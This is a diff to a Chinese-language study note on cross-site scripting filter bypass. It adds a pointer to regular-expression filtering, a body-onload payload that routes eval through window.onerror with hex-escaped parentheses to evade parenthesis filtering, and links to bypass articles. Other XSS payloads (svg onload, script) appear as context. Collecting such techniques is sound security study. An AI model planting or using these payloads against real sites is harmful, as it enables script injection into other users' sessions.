@@ -57,6 +57,10 @@ cript:
 alert(/1/);">
 ```
 
+## 正規表達式
+js中會用正規表達式來過濾危險字符，參考如下文件：  
+[Documentation](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#.E9.80.9A.E8.BF.87.E5.8F.82.E6.95.B0.E8.BF.9B.E8.A1.8C.E9.AB.98.E7.BA.A7.E6.90.9C.E7.B4.A2)
+
 ## 攻擊手勢  
 * script  
 ```js
@@ -72,7 +76,15 @@ alert(/1/);">
 ```js
 <svg/onload=alert(1)>
 ```
+* body  
+```js
+<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29’;>   
+// 這種payload也可以繞過括號過濾
+```
 
 ## Reference
 1. The Web Application Hacker's Handbook  
-2. [看雪](https://www.kanxue.com)
+2. [看雪](https://www.kanxue.com)  
+3. [烏雲](http://wps2015.org/drops/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html)  
+4. [云淡风轻](http://blog.idhyt.com/2014/10/15/technic-xss-bypass/)  
+5. [freebuf](http://www.freebuf.com/articles/web/153055.html)
